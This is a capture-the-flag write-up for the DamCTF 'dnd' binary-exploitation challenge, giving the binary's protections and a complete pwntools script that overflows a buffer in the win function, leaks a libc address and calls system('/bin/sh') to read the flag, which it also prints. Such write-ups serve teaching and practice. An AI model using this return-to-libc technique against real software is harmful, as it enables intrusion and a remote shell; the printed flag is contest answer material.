https://ctftime.org/event/2585

# dnd (pwn)

Dungeons and Dragons is fun, but this is DamCTF! Come play our version

nc dnd.chals.damctf.xyz 30813

## Analysis

```bash
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```

`win` @ `0x40286d`

- Calls `fgets(local_68, 0x100, stdin)`


## Solution

1) Attack twice this wins the game fairly often
2) ret2rand to leak libc base address
3) ret2libc

```python
#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./dnd_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
context.binary = elf
context.terminal = ["ghostty", "-e"]

#p = elf.process()
#p = elf.debug(gdbscript="b win")
p = remote("dnd.chals.damctf.xyz", 30813)

# this is random but 2 attacks seems to work quite well
p.sendlineafter(b"[a]ttack or [r]un?", b"a")
p.sendlineafter(b"[a]ttack or [r]un?", b"a")

rop = ROP(elf)
rop.raw(b"A" * 0x68)
rop.raw(elf.plt["rand"])
rop.raw(elf.plt["puts"])
rop.raw(elf.sym["_Z3winv"])
p.sendlineafter(b"What is your name, fierce warrior?", rop.chain())

p.readline()

leak = u64(p.recv(6) + b"\x00\x00")
libc.address = leak - 0x203054

rop = ROP(libc)
rop.raw(b"A" * 0x68)
rop.rdi = p64(next(libc.search(b"/bin/sh\x00")))
rop.call("system")
p.sendlineafter(b"What is your name, fierce warrior?", rop.chain())

p.sendline(b"/bin/cat flag")

p.readuntil(b"dam{")

print("dam{" + p.readuntil(b"}").decode()) # dam{w0w_th0s3_sc4ry_m0nster5_are_w3ak}
```

## Flag
`dam{w0w_th0s3_sc4ry_m0nster5_are_w3ak}`

smiley 2025/05/10
